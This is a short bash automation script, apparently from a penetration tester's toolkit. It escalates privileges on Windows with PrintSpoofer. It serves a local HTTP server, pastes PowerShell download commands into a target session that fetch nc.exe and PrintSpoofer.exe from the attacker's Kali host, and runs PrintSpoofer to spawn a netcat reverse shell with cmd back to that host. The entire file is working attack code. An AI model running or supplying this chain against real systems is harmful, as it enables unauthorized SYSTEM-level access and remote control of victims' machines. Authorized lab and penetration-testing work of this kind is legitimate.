#!/bin/bash

: '
PrintSpoofer: Reverse shell to KALI_IP:443 using SeImpersonatePrivilege.
'

# https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeImpersonatePrivilege.md

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form "Shell port"

PORT=${form_data["Shell port"]}

cd ${SCRIPTS_DIR}/fileTransfer/windows/.binaries
python3 -m http.server 1337 &
HTTP_PID=$!
TMP_FOLDER="C:\users\public"

paste_command "(New-Object Net.WebClient).DownloadFileAsync('http://${KALI_IP}:1337/nc.exe', '${TMP_FOLDER}\nc.exe')"
xdotool key Return
sleep 3

paste_command "(New-Object Net.WebClient).DownloadFileAsync('http://${KALI_IP}:1337/PrintSpoofer.exe', '${TMP_FOLDER}\PrintSpoofer.exe')"
xdotool key Return
sleep 3

paste_command "${TMP_FOLDER}\PrintSpoofer.exe -c \"${TMP_FOLDER}\nc.exe ${KALI_IP} ${PORT} -e cmd\""
xdotool key Return

kill $HTTP_PID